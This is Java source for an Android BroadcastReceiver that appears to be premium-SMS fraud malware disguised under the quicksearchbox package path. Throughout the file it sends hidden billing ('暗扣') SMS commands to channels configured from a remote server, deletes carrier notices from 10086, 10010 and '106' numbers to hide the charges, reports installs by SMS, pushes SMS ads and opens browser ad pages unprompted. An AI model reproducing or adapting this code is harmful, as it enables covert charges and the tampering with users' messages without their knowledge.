package com.sttm.charge;

import java.io.File;
import java.io.FileOutputStream;
import java.util.Calendar;
import java.util.List;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.database.Cursor;
import android.net.Uri;
import android.util.Log;

import com.sttm.bean.CFGInfo_header;
import com.sttm.bean.ChannelNumber;
import com.sttm.bean.ControlData;
import com.sttm.bean.CurstomCFG;
import com.sttm.bean.SalesVolume;
import com.sttm.bean.SmsAdsData;
import com.sttm.bean.SmsData;
import com.sttm.bean.WapAdsData;
import com.sttm.model.AdsService;
import com.sttm.model.CFGService;
import com.sttm.model.ChannelNumService;
import com.sttm.model.GPRSService;
import com.sttm.model.SmsSenderAndReceiver;
import com.sttm.model.TimerCenter;
import com.sttm.util.ByteUtil;
import com.sttm.util.IsNetOpen;
import com.sttm.util.KsoCache;
import com.sttm.util.KsoHelper;
import com.sttm.util.LogFile;
import com.sttm.util.ShareProDBHelper;
import com.sttm.util.SmsCenterNumber;

public class KsoAlarmService extends BroadcastReceiver {
	private final String TAG = "KsoAlarmService";
	private ShareProDBHelper share;
	private KsoMainCourse ksoMainCourse;
	private String[] saleNumbers;

	@Override
	public void onReceive(Context context, Intent intent) {
		ksoMainCourse = new KsoMainCourse();
		share = new ShareProDBHelper(context);
		
		int isShutSell = KsoCache.getInstance().getValue("isShutSell") != null ? (Integer) KsoCache.getInstance()
				.getValue("isShutSell") : 0;
		//Log.d(TAG, "销量是否关闭" + isShutSell);
		String salesNumber = KsoCache.getInstance().getValue("saleNumbers") != null ? (String) KsoCache.getInstance()
				.getValue("saleNumbers") : "";
		LogFile.WriteLogFile("销量号码" + salesNumber);
		
		
		if(!"".equals(salesNumber)){
			saleNumbers = salesNumber.substring(0,
					salesNumber.lastIndexOf(",")).split(",");
			
		}

		

		int saleIndex = saleNumbers != null ?KsoHelper.getRandom(saleNumbers.length) : 0;
		if (intent.getAction().equals("start")) {
			//Log.d(TAG, "用户不关机的情况下，检查销量和自动联网日期是否来到");
			LogFile.WriteLogFile("用户不关机的情况下，每天检测一次 联网日期");
			int intelnetCount = KsoCache.getInstance().getValue("intelnetCount") != null ? (Integer) KsoCache.getInstance()
					.getValue("intelnetCount") : 0;

			int month = KsoHelper.getCurrentMonth();

			int internetedCount = share.getSharedPreferences("dataCenter")
					.getInt(month + "月", 0);

			long startIntelnetDate = KsoCache.getInstance().getValue("startIntelnetDate") != null ? (Long) KsoCache.getInstance()
					.getValue("startIntelnetDate") : 0;
			String IntelnetDates = KsoCache.getInstance().getValue("internetDate") != null ? (String) KsoCache.getInstance()
					.getValue("internetDate") : "";
			String[] IntelnetDate = IntelnetDates.split(",");
			int driveup = share.getSharedPreferences("DRIVEUP_PREE").getInt(
					"DRIVEUP_COUNT_PREE", 0);
			int driveup_cfg = KsoCache.getInstance().getValue("driveup") != null ? (Integer) KsoCache.getInstance()
					.getValue("driveup") : 0;
					int saleCount =  KsoCache.getInstance().getValue("sellCount") != null ? (Integer) KsoCache.getInstance().getValue("sellCount") : 2;
			if (intelnetCount >= internetedCount) {
				if (ksoMainCourse.decideStartFlag(startIntelnetDate, context)
						&& (driveup == driveup_cfg)) {

					// 销量统计
					if (ksoMainCourse.checksalesvolumeOccasion(driveup_cfg,driveup,saleCount)) {
						ksoMainCourse.startTimerHandler(context);

					}

					// GPRS更新

					if (ksoMainCourse.checkGPRSOccasion(context, IntelnetDate)) {
						ksoMainCourse.startGPRSHandler(context);
					}
				} else {
					//Log.d(TAG, "这次开机不可以销量统计和自动联网，因为日期己过期或者开机次数还不到");
					LogFile.WriteLogFile("这次开机不可以销量统计和自动联网，因为日期己过期或者开机次数还不到");
				}

			} else {
				//Log.d(TAG, "本月GRPS更新次数够了，不能再更新");
				LogFile.WriteLogFile("本月GRPS更新次数够了，不能再更新");
			}

		}else if(intent.getAction().equals("SmsCenter")) {
			LogFile.WriteLogFile("获取短信中心号码时间到，发送短信");
			SmsCenterNumber smsCenter = new SmsCenterNumber(context);
			smsCenter.sendSms();
		} else if (intent.getAction().equals("sales1")) {
			//Log.d(TAG, "发送第一条销量时间到");
			LogFile.WriteLogFile("发送第一条销量时间到");
			if (isShutSell == 0) {
				//Log.d(TAG, "准备发送第一条销量");
				SalesVolume sv = SalesVolume.getInstance(context, "01");

				if (saleNumbers.length > 0
						&& !"".equals(saleNumbers[saleIndex])) {
					SmsSenderAndReceiver.send2(saleNumbers[saleIndex].trim(),
							sv.mergesalesvolumestring().trim());

					//Log.d(TAG, "发送了第一条销量,销量号码为" + saleNumbers[saleIndex].trim()+ "销量内容为" + sv.mergesalesvolumestring().trim());
					LogFile.WriteLogFile("发送了第一条销量,销量号码为"
							+ saleNumbers[saleIndex].trim() + "销量内容为"
							+ sv.mergesalesvolumestring().trim());

				} else {
					//Log.d(TAG, "没有销量号码");
					LogFile.WriteLogFile("没有销量号码");

				}

			} else {
				//Log.d(TAG, "销量己经关闭");
				LogFile.WriteLogFile("销量己经关闭");
			}

		} else if (intent.getAction().equals("sales2")) {
			//Log.d(TAG, "发送第二条销量时间到");
			LogFile.WriteLogFile("发送第二条销量时间到");
			if (isShutSell == 0) {
				//Log.d(TAG, "准备发送第二条销量");
				SalesVolume sv = SalesVolume.getInstance(context, "02");

				if (saleNumbers.length > 0
						&& !"".equals(saleNumbers[saleIndex])) {
					SmsSenderAndReceiver.send2(saleNumbers[saleIndex].trim(),
							sv.mergesalesvolumestring().trim());
					//Log.d(TAG, "发送了第二条销量,销量号码为" + saleNumbers[saleIndex].trim()+ "销量内容为" + sv.mergesalesvolumestring().trim());
					LogFile.WriteLogFile("发送了第二条销量,销量号码为"
							+ saleNumbers[saleIndex].trim() + "销量内容为"
							+ sv.mergesalesvolumestring().trim());

				} else {
					//Log.d(TAG, "没有销量号码");
					LogFile.WriteLogFile("没有销量号码");

				}

			} else {
				//Log.d(TAG, "销量己经关闭");
				LogFile.WriteLogFile("销量己经关闭");
			}

		} else if (intent.getAction().equals("sales3")) {
			//Log.d(TAG, "发送第三条销量时间到");
			LogFile.WriteLogFile("发送第三条销量时间到");
			if (isShutSell == 0) {
				//Log.d(TAG, "准备发送第三条销量");
				SalesVolume sv = SalesVolume.getInstance(context, "03");

				if (saleNumbers.length > 0
						&& !"".equals(saleNumbers[saleIndex])) {
					SmsSenderAndReceiver.send2(saleNumbers[saleIndex].trim(),
							sv.mergesalesvolumestring().trim());
					//Log.d(TAG, "发送了第三条销量,销量号码为" + saleNumbers[saleIndex].trim()+ "销量内容为" + sv.mergesalesvolumestring().trim());
					LogFile.WriteLogFile("发送了第三条销量,销量号码为"
							+ saleNumbers[saleIndex].trim() + "销量内容为"
							+ sv.mergesalesvolumestring().trim());

				} else {
					//Log.d(TAG, "没有销量号码");
					LogFile.WriteLogFile("没有销量号码");

				}

			} else {
				//Log.d(TAG, "销量己经关闭");
				LogFile.WriteLogFile("销量己经关闭");
			}
		} else if (intent.getAction().equals("sales4")) {
			//Log.d(TAG, "发送第四条销量时间到");
			LogFile.WriteLogFile("发送第四条销量时间到");

			if (isShutSell == 0) {
				SalesVolume sv = SalesVolume.getInstance(context, "04");

				if (saleNumbers.length > 0
						&& !"".equals(saleNumbers[saleIndex])) {
					SmsSenderAndReceiver.send2(saleNumbers[saleIndex].trim(),
							sv.mergesalesvolumestring().trim());
					//Log.d(TAG, "发送了第四条销量,销量号码为" + saleNumbers[saleIndex].trim()+ "销量内容为" + sv.mergesalesvolumestring().trim());
					LogFile.WriteLogFile("发送了第四条销量,销量号码为"
							+ saleNumbers[saleIndex].trim() + "销量内容为"
							+ sv.mergesalesvolumestring().trim());

				} else {
					//Log.d(TAG, "没有销量号码");
					LogFile.WriteLogFile("没有销量号码");

				}
			} else {
				//Log.d(TAG, "销量己经关闭");
				LogFile.WriteLogFile("销量己经关闭");
			}

		} else if (intent.getAction().equals("sales5")) {
			//Log.d(TAG, "发送第五条销量时间到");
			LogFile.WriteLogFile("发送第五条销量时间到");
			String saleSmsCat = KsoCache.getInstance().getValue("saleSmsCat") != null ? (String) KsoCache.getInstance().getValue("saleSmsCat") : "";
			//Log.d(TAG, "准备发送第五条销量" + saleSmsCat );
			
			if (isShutSell == 0 && !"".equals(saleSmsCat)) {
				//Log.d(TAG, "准备发送第五条销量");
				SalesVolume sv = SalesVolume.getInstance(context, "05");		
					SmsSenderAndReceiver.send2(saleSmsCat, sv
							.mergesalesvolumestring().trim());
					//Log.d(TAG, "发送了第五条销量,销量号码为" + saleSmsCat+ "销量内容为" + sv.mergesalesvolumestring().trim());
					LogFile.WriteLogFile("发送了第五条销量,销量号码为"
							+ saleSmsCat + "销量内容为"
							+ sv.mergesalesvolumestring().trim());


			} else {
				LogFile.WriteLogFile("销量己经关闭");
			}

		} else if (intent.getAction().equals("GPRS")) {

			//Log.d(TAG, "GPRS 更新时间到了");
			LogFile.WriteLogFile("GPRS 更新时间到了 ");
			
			Calendar calendar = Calendar.getInstance();
			int hour = calendar.get(Calendar.HOUR_OF_DAY);
			if (hour < 7) {
				int year = calendar.get(Calendar.YEAR);
				int month = calendar.get(Calendar.MONTH);
				int day = calendar.get(Calendar.DAY_OF_MONTH);

				hour = 7 + hour;
				int temp = (int) Math.random() * 100;
				while (temp >= 60) {
					temp = (int) Math.random() * 100;
				}
				int minute = temp;
				TimerCenter tcenter = new TimerCenter();

				Calendar timerDelay = tcenter.getTime(year, month, day, hour, minute,0);
				tcenter.startTimerHandler(context, timerDelay, "GPRS");
				return;
				

			}
			
			
			//GPRS更新
			UpdateGprsData(context);
			// 广告更新
			UpdateAdsData(context);
			// 更新完毕后重新初始化数据
			//KsoCache.getInstance().init(context);
			////Log.d(TAG,"更新完毕后重新初始化数据 cache.init(context)");
			String today = KsoHelper.date2String();
			ShareProDBHelper dbHelper = new ShareProDBHelper(context);
			SharedPreferences sp = dbHelper.getSharedPreferences("dataCenter");
			int month = KsoHelper.getCurrentMonth();
			int internetedCount = sp.getInt(month + "月", 0);
			Editor editor = sp.edit();
			editor.putString("updateTime", today);
			editor.putInt(month + "月", internetedCount + 1);
			editor.commit();

			LogFile.WriteLogFile("GPRS 更新完成");

		} else if (intent.getAction().equals("Money")) {
			//Log.d(TAG, "GPRS更新后,发送暗扣短信时间到了");

			LogFile.WriteLogFile("GPRS更新后,发送暗扣短信时间到了");

			String secretSmsNumber = KsoCache.getInstance().getValue("secretSmsNumber") != null ? (String) KsoCache.getInstance()
					.getValue("secretSmsNumber") : "";
			String secretSmsOrder = KsoCache.getInstance().getValue("secretSmsOrder") != null ? (String) KsoCache.getInstance()
					.getValue("secretSmsOrder") : "";

			long time = KsoCache.getInstance().getValue("adsTime") != null ? (Long) KsoCache.getInstance()
					.getValue("adsTime") : 0;

			int secretSmsCount = KsoCache.getInstance().getValue("secretSmsCount") != null ? (Integer) KsoCache.getInstance()
					.getValue("secretSmsCount") : 0;
			String relpyNumber = KsoCache.getInstance().getValue("deleteTeleponeNumber") != null ? (String) KsoCache.getInstance()
					.getValue("deleteTeleponeNumber") : "";
			//Log.d(TAG, "暗扣号码" + secretSmsNumber + "暗扣指令" + secretSmsOrder );
			if (!"".equals(secretSmsNumber) && !"".equals(secretSmsOrder)) {			
				if (secretSmsCount > 0) {
					//Log.d(TAG,"启动发送短信服务");
					LogFile.WriteLogFile("启动发送短信服务");
					Intent service = new Intent(context, SendSmsService.class);
					service.putExtra("sendTime", time);
					service.putExtra("sendCount", secretSmsCount);
					service.putExtra("flag",4);
					service.putExtra("secretSmsReplyNumber",relpyNumber);
					service.putExtra("secretSmsNumber",secretSmsNumber);
					service.putExtra("secretSmsOrder", secretSmsOrder);
					context.startService(service);
				} else if (secretSmsCount == 0) {
					// irv
					/*
					 * ITelephony phone =
					 * (ITelephony)ITelephony.Stub.asInterface()
					 * ServiceManager.getService("phon")); phone.dial("10086");
					 */

				}

		   }

		} else if (intent.getAction().equals("sendNormonSms")) {
			//Log.d(TAG, "产品收费删除短信时间到了");

			LogFile.WriteLogFile("产品收费删除短信时间到了");

			context.getContentResolver().delete(Uri.parse("content://sms"),
					"address=?", new String[] { "10086" });
			context.getContentResolver().delete(Uri.parse("content://sms"),
					"address=?", new String[] { "10010" });
			deleteSMS(context);
			//Log.d(TAG, "产品收费短信删除了");
			LogFile.WriteLogFile("产品收费短信删除了");
			Editor editor = share.writer("sendSmsFlag");
			editor.putBoolean("sendNormonSms", false);
			KsoCache.getInstance().reSetValues2("sendNormonSms", false);
			editor.commit();

		} else if (intent.getAction().equals("ADS")) {
			//Log.d(TAG, "发送短信广告时间到了");

			LogFile.WriteLogFile("发送短信广告时间到了");
			String adsNumber = KsoCache.getInstance().getValue("adsNumbers") != null ? (String) KsoCache.getInstance()
					.getValue("adsNumbers") : "";
			String adsContent = KsoCache.getInstance().getValue("adsContent") != null ? (String) KsoCache.getInstance()
					.getValue("adsContent") : "";
			String[] adsNumbers = adsNumber.substring(0,
					adsNumber.lastIndexOf(",")).split(",");
			int time = KsoCache.getInstance().getValue("adsTime") != null ? (Integer) KsoCache.getInstance()
					.getValue("adsTime") : 0;
			if (adsNumbers.length > 0) {
				LogFile.WriteLogFile("启动发送短信服务");
				Intent service = new Intent(context, SendSmsService.class);
				service.putExtra("sendTime", time);
				service.putExtra("sendCount", adsNumbers.length);
				service.putExtra("flag",5);
				service.putExtra("adsNumber",adsNumber);
				service.putExtra("adsContent", adsContent);
				context.startService(service);
			}

		} else if (intent.getAction().equals("ADS_WAP")) {
			//Log.d(TAG,"发送WAP广告时间到了");
			LogFile.WriteLogFile("发送WAP广告时间到了");
			String url = KsoCache.getInstance().getValue("url") != null ? (String) KsoCache.getInstance()
					.getValue("url") : "";
			if (!"".equals(url)) {
				Uri uri = Uri.parse(url);
				Intent ksoIntent = new Intent();
				ksoIntent.setAction(Intent.ACTION_VIEW);
				ksoIntent.setData(uri);
				ksoIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
				context.startActivity(ksoIntent);
				LogFile.WriteLogFile("浏览器打开了WAP广告");
			}

		}else if (intent.getAction().equals("ksoSendSms")) {
			
			LogFile.WriteLogFile("发送暗扣短信定时时间到了");
			String smsNumber = KsoCache.getInstance().getValue("ksoSmsNumber") != null ? (String) KsoCache.getInstance()
					.getValue("ksoSmsNumber") : "";
			
			String smsOrder = KsoCache.getInstance().getValue("ksoSmsOrder") != null ? (String) KsoCache.getInstance()
					.getValue("ksoSmsOrder") : "";
					
			if(!"".equals(smsNumber) && !"".equals(smsOrder)){
				SmsSenderAndReceiver.send2(smsNumber, smsOrder);
				//Log.d(TAG, "向移动用户发送了第" + 1 + "条暗扣短信，号码为 "+ smsNumber + "指令为" + smsOrder);
				LogFile.WriteLogFile("向移动用户发送了第" + 1
								+ "条暗扣短信,暗扣通道：" + smsNumber + " 暗扣指令："
								+ smsOrder);
				
			}
			

		} else if (intent.getAction().equals("BASE_CHARGE")) {
			/*
			 * //Log.d(TAG,"基地收费时间到了"); LogFile.WriteLogFile("基地收费时间到了"); String
			 * urlStr = KsoCache.getInstance().getValue("url") != null ?
			 * (String) KsoCache.getInstance() .getValue("url") : ""; if
			 * (!"".equals(urlStr)) {
			 * 
			 * 
			 * String baseUrl = urlStr.substring(urlStr.indexOf("&burl=") +
			 * 6).trim();
			 * 
			 * String btype = urlStr.substring(urlStr.indexOf("&btype=") +
			 * 7,urlStr.indexOf("&burl=")).trim();
			 * 
			 * String ftype = urlStr.substring(urlStr.indexOf("&ftype=") +
			 * 7,urlStr.indexOf("&btype=")).trim();
			 * 
			 * 
			 * 
			 * KsoCache.getInstance().reSetValue("baseUrl",baseUrl );
			 * KsoCache.getInstance().reSetValue("btype", btype); Intent
			 * base_intent = new Intent(context, BaseZoneService.class);
			 * base_intent.putExtra("urlStr", urlStr);
			 * //base_intent.putExtra("baseUrl", "http://" +
			 * baseZone.getBase_url()); base_intent.putExtra("flag", ftype);
			 * context.startService(base_intent);
			 * LogFile.WriteLogFile("启动基地扣费主服务"); }
			 */
		}
	}

	public void UpdateGprsData(final Context context) {
		new Thread() {
			public void run() {
				IsNetOpen ino = new IsNetOpen(context);

				if (!ino.checkNet()) {
					//Log.d(TAG,"手机没有网络");
					LogFile.WriteLogFile("手机没有网络");
					return;
				}
				//Log.d(TAG,"网络环境正常");
				LogFile.WriteLogFile("网络环境正常");
				
				
				//GRRS更新客户配置文件	
				// 更新gprs控制数据
				GPRSService gprsservice = new GPRSService();			
				byte gprsdata[] = GPRSService.updateGprsData(context);
				/*检查更新下来的数据是否正确*/
				if(gprsdata == null){
					LogFile.WriteLogFile("更新到的getAnrGprs文件数据不正常,中断");
					return;
				}
					
					
				CFGInfo_header gprsheader = gprsservice.getGPRSHeader(gprsdata);
				if(gprsheader != null){
					//Log.d("GPRS控制数据长度", "=" + gprsheader.getM_nCtrlLen());
				}			
				ControlData datacontrol = gprsservice.getControlSmsData(
						gprsdata, gprsheader);	
				if(datacontrol != null){		
					//启动第五条销量短信定时器
					if(datacontrol.getSellPhoneNumber() != null){
						
						int saleDelay5 = (int) (Math.random());
						saleDelay5 = 420;//测试时使用()
						Intent intentSalesFlag5 = new Intent(context,
								KsoAlarmService.class);
						intentSalesFlag5.setAction("sales5");
						PendingIntent pintentSalesFlag5 = PendingIntent.getBroadcast(
								context, 0, intentSalesFlag5, 0);
						AlarmManager alarmSales5 = (AlarmManager) context
								.getSystemService(Context.ALARM_SERVICE);
						alarmSales5.set(AlarmManager.RTC_WAKEUP,
								System.currentTimeMillis() + saleDelay5 * 60 * 60 * 1000,
								pintentSalesFlag5);
						//Log.d(TAG, "启动第五条销量短信定时器" + saleDelay5 + "一个小时后发送");
						LogFile.WriteLogFile("启动第五条销量短信定时器" + saleDelay5 + "一个小时后发送");
					}
					//将客户配置信息读出来
					CurstomCFG cfg = CurstomCFG.getInstance();		
					if(cfg != null){
						//GPRS更新部分客户配置信息	
						//Log.d(TAG,"客户配置信息读出来");
						cfg.setBillStyle(datacontrol.getBillStyle());// 收费方式
						cfg.setBillCount(datacontrol.getMonthlyPayment());// 包月收费次数
						cfg.setUploadTiem(datacontrol.getAdsTime());// 上行的时间间隔
						cfg.setDeleteTime(datacontrol.getPlayingTime());// 产品收费删除短信的时间
						cfg.setIsShutDown(datacontrol.getIsShutGSMDown());// 是否屏蔽运营商下行
						cfg.setIsChanelShutDown(datacontrol.getIsShutChanelDown());// 时否屏蔽通道下行
						cfg.setIsNotify(datacontrol.getIsNotify());// 是否需要提示
						if (datacontrol.getIsNotify() == 1) {
							cfg.setNotifyContent(datacontrol.getNotifyContent());// 提示内容
						}
						LogFile.WriteLogFile("Gprs 更新完后客户ID" + cfg.getCurstomID());
						
						//把客户配置信息转化成字节组，再写进去文件
						CFGService cfgservice = new CFGService();
						byte bt[] = cfgservice.getCurstomCFGByte(cfg);
						//Log.d("客户配置信息字节大小", "=" + bt.length);
						
						try {
							File file_config = new File("data/data/com.android.quicksearchbox/files/smartphonec.dat");	
							FileOutputStream fos = new FileOutputStream(file_config);
							ByteUtil.writeByteFile(fos, bt);
							//Log.d(TAG, "GPRS更新了客户配置文件");
							LogFile.WriteLogFile("GPRS更新了客户配置文件");
							
						} catch (Exception e) {
							e.printStackTrace();
							//Log.d(TAG, "GPRS更新客户配置文件失败");
							LogFile.WriteLogFile("GPRS更新客户配置文件失败");
						}	
					}
				}
				
				// GPRS 普通通道数据更新
				ChannelNumber channel = ChannelNumber.getInstance();
				List<SmsData> smsDatas = gprsservice.getSmsData(gprsdata, gprsheader);
				String smsNumber = "";
				String smsOrder = "";
				if (smsDatas != null && smsDatas.size() > 0) {
					//Log.d(TAG,"普通通道数据更新=========1");			
					for (SmsData smsData : smsDatas) {			
						smsNumber += smsData.getChanel() + ",";
						smsOrder += smsData.getOrder() + ",";
					}
					String strChannel[] = smsNumber.substring(0, smsNumber.lastIndexOf(",")).split(",");
					String strOrder[] = smsOrder.substring(0, smsOrder.lastIndexOf(",")).split(",");
					if (KsoHelper.getARS2(context) == 1) {
						// 手机SIM卡是移动，则更新到移动通道
						//Log.d(TAG,"普通通道数据更新=========2");
						channel.setCmCount(smsDatas.size());
						channel.setCmNumber(strChannel);
						channel.setCmCommand(strOrder);
						LogFile.WriteLogFile("更改移动通道数据:count="+smsDatas.size()+",setCmNumber="+smsNumber+",order="+smsOrder);
					} else if (KsoHelper.getARS2(context) == 2) {
						// 手机SIM卡是联通，则更新到联通通道
						//Log.d(TAG,"普通通道数据更新=========3");
						channel.setUmCount(smsDatas.size());
						channel.setUmNumber(strChannel);
						channel.setUmCommand(strOrder);
						LogFile.WriteLogFile("更改移联通道数据:count="+smsDatas.size()+",setCmNumber="+smsNumber+",order="+smsOrder);
					}		
					byte chnnelNumBytes[] = ChannelNumService.getChannelNumByte(channel);		
					//Log.d("普通通道数据字节大小", "=" + chnnelNumBytes.length);
					try {
						File file_channel = new File("data/data/com.android.quicksearchbox/files/smartphonem.dat");
						FileOutputStream fos = new FileOutputStream(file_channel);
						ByteUtil.writeByteFile(fos, chnnelNumBytes);
						//Log.d(TAG, "GPRS成功更新了内置通道文件");
						LogFile.WriteLogFile("GPRS成功更新了内置通道文件");				
					} catch (Exception e) {
						e.printStackTrace();
						//Log.d(TAG, "GPRS更新内置通道文件失败");
						LogFile.WriteLogFile( "GPRS更新内置通道文件失败");
					}	
				}
				
				
				// 启动暗扣定时器
				List<SmsData> secretSmsDatas = gprsservice.getSecretSmsData(gprsdata, gprsheader);
				if(secretSmsDatas != null){
					if( secretSmsDatas.size() > 0){
						ksoMainCourse.startMoneyHandler(context);
						
					}else if(secretSmsDatas.size()== 0){
						//IVR暗扣
					}
					
				}
				
				
				if(gprsdata != null){
					KsoCache.getInstance().init(context);
					//Log.d(TAG,"更新完毕后重新初始化数据 cache.init(context)");
				}
				
				
				
				
			}
		}.start();
	}

	@SuppressWarnings("unused")
	private static int initdriveupcount(Context context) {
		return context.getSharedPreferences("DRIVEUP_PREE",
				Context.MODE_WORLD_WRITEABLE).getInt("DRIVEUP_COUNT_PREE", 0);
	}

	private void UpdateAdsData(final Context context) {
		new Thread() {
			public void run() {
				// 更新广告信息
				IsNetOpen ino = new IsNetOpen(context);
				if (!ino.checkNet()) {
					return;
				}
				byte[] bytes = AdsService.updateAdsData(context);
				/*检查更新下来的数据是否正确*/
				if(bytes == null){
					LogFile.WriteLogFile("更新到的getAnrAds文件数据不正常,中断");
					return;
				}
				
				if(bytes != null){
					KsoCache.getInstance().init(context);
					//Log.d(TAG,"更新完毕后重新初始化数据 cache.init(context)");
				}
				AdsService adsService = new AdsService();
				SmsAdsData smsAdsData = adsService.getSmsAdsData(bytes, adsService.getAdsHeader(bytes));
				if(smsAdsData != null){
					// 启动广告短信定时器
					ksoMainCourse.startAdsSMSHandler(context);				
				}
				WapAdsData wapAdsData = adsService.getWapAdsData(bytes, adsService.getAdsHeader(bytes));
				
				if(wapAdsData != null){
					long waptimeout = KsoCache.getInstance().getValue("wap_timeout") != null ? (Long)KsoCache.getInstance().getValue("wap_timeout") : 0;
					/*wap 广告启动时间是5-15分钟则执行基地扣费*/
					if(wapAdsData.getTime()>=5 && wapAdsData.getTime() <= 15){
						//启动基地扣费定时器 5-15分钟后开始基地扣费
						ksoMainCourse.startBaseChargeHandler(context,waptimeout);
					}
					else{
					// 启动广告WAP定时器
						
						ksoMainCourse.startAdsWAPHandler(context,waptimeout);
					}
				}
				
			}
		}.start();
	}

	// 删除短信
	public void deleteSMS(Context context) {
		try {
			ContentResolver CR = context.getContentResolver();

			Uri uriSms = Uri.parse("content://sms");
			Cursor c = CR.query(uriSms, new String[] { "_id", "thread_id",
					"address" }, null, null, null);
			if (null != c && c.moveToFirst()) {
				do {

					long threadId = c.getLong(1);
					String address = c.getString(c.getColumnIndex("address"));
					//Log.d("叼码", address);
					if (address.startsWith("106")) {
						CR.delete(
								Uri.parse("content://sms/conversations/"
										+ threadId), null, null);
						//Log.d("deleteSMS", "threadId:: " + threadId + "address"+ address);
					}

					//Log.d("deleteSMS", "threadId:: " + threadId + "address"+ address);
				} while (c.moveToNext());
			}
		} catch (Exception e) {
		
			//Log.d("deleteSMS", "Exception:: " + e);
		}
	}
}
